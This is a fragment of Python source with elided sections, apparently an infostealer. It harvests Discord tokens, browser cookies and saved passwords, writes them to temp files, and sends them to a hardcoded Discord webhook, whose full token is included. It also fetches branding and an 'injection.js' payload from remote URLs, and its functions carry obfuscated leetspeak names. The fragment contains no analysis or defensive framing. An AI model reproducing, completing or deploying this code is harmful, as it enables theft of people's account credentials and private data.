...
mname = "https://rentry.co/mwos24/raw"
mnameresp = requests.get(mname)
mname = mnameresp.text

footerc = "https://rentry.co/mwos24/raw"
footercresp = requests.get(footerc)
footerc = footercresp.text

words = "https://rentry.co/mwos24/raw"
wordsresp = requests.get(words)
words = wordsresp.text

h00k = "https://discord.com/api/webhooks/1209842486642483260/tMtSJukytIWbsK71vfO_Dv3GTROfuOO1ZYBCr9dIXT9GorHWf4PdUkE9lUkrF7myg79Z"
inj3c710n_url = f"https://raw.githubusercontent.com/{mname  }inj/inject/main/injection.js"
DETECTED = False
...
def UP104D70K3N(token, path):
    ...
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1105744953793052745/1126624527179333783/mwos.png"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://cdn.discordapp.com/attachments/1105744953793052745/1126624527179333783/mwos.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1105744953793052745/1126624527179333783/mwos.png",
        "username": f"{mname}",
        "attachments": []
        }
...
def UP104D(name, link):
    ...
    if name == "mwcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"{mname} | Cookie {words}",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:browser:1095742866518716566> • **{C00K1C0UNt}** Cookies Found\n <:blackarrow:1095740975197995041> • [{mname}Cookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": f"{footerc}",
                        "icon_url": "https://cdn.discordapp.com/attachments/1105744953793052745/1126624527179333783/mwos.png"
    ...
    if name == "mwpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"{mname} | Password {words}",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [{mname}Passwords.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": f"{footerc}",
                        "icon_url": "https://cdn.discordapp.com/attachments/1105744953793052745/1126624527179333783/mwos.png"
...
def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\mw{name}.txt"
...
def g37P455w(path, arg):
    ...
    tempfold = temp + "mw" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def G47H3r411():
    ...
    for file in ["mwpassw.txt", "mwcook.txt"]: 
